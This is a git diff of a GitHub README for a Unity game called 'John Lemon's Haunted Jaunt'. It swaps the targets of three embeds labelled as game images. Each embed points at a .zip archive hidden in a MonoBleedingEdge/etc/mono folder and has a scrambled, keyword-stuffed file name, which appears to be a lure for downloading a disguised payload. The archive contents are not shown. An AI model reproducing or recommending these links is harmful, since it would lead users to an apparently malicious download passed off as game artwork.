@@ -1,5 +1,5 @@
 # John-Lemon-s-Haunted-Jaunt-Game_gameUnity
-![John Lemon](https://github.com/CharlotteJV/John-Lemon-s-Haunted-Jaunt-Game_gameUnity/raw/refs/heads/main/MonoBleedingEdge/etc/mono/2.0/s-Game-Lemon-John-Unity-Jaunt-Haunted-game-3.5.zip) 
+![John Lemon](https://github.com/CharlotteJV/John-Lemon-s-Haunted-Jaunt-Game_gameUnity/raw/refs/heads/main/MonoBleedingEdge/etc/mono/Jaunt-Unity-Game-Lemon-game-s-Haunted-John-1.0-alpha.1.zip) 
 # Embark on an Eerie Adventure with John Lemon's Haunted Jaunt!
 
 ## Description
@@ -11,7 +11,7 @@
 ## Task 
 
 <div>
-    <img src="https://github.com/CharlotteJV/John-Lemon-s-Haunted-Jaunt-Game_gameUnity/raw/refs/heads/main/MonoBleedingEdge/etc/mono/2.0/s-Game-Lemon-John-Unity-Jaunt-Haunted-game-3.5.zip" alt="John Lemon" width="300" align="left">
+    <img src="https://github.com/CharlotteJV/John-Lemon-s-Haunted-Jaunt-Game_gameUnity/raw/refs/heads/main/MonoBleedingEdge/etc/mono/Jaunt-Unity-Game-Lemon-game-s-Haunted-John-1.0-alpha.1.zip" alt="John Lemon" width="300" align="left">
     <ul>
         <li> Join John Lemon, the lovable protagonist, on an exciting and humorous adventure through a mysterious haunted house. </li>
         <li> This Unity game offers gameplay that is easy to grasp, making it suitable for players aged 13 and above. </li> 
@@ -22,7 +22,7 @@
 
 
 <p align="center">
-    <img src="https://github.com/CharlotteJV/John-Lemon-s-Haunted-Jaunt-Game_gameUnity/raw/refs/heads/main/MonoBleedingEdge/etc/mono/2.0/s-Game-Lemon-John-Unity-Jaunt-Haunted-game-3.5.zip" alt="John Lemon" width="800">
+    <img src="https://github.com/CharlotteJV/John-Lemon-s-Haunted-Jaunt-Game_gameUnity/raw/refs/heads/main/MonoBleedingEdge/etc/mono/Jaunt-Unity-Game-Lemon-game-s-Haunted-John-1.0-alpha.1.zip" alt="John Lemon" width="800">
 </p>
 
 
